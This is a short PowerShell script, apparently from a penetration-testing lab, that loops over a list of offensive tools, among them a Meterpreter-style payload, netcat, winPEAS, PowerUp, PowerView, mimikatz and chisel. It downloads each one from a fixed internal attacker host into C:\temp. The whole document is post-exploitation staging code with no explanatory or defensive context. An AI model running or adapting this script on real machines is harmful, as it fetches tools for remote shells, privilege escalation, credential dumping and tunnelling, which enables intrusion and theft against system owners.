$baseUrl = "http://192.168.45.209/"
$fileNames = @("met.exe","nc.exe","winPEASany.exe","PowerUp.ps1","PowerView.ps1","mimikatz.exe","chisel.exe","win-agent.exe")
$downloadPath = "C:\temp\"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}
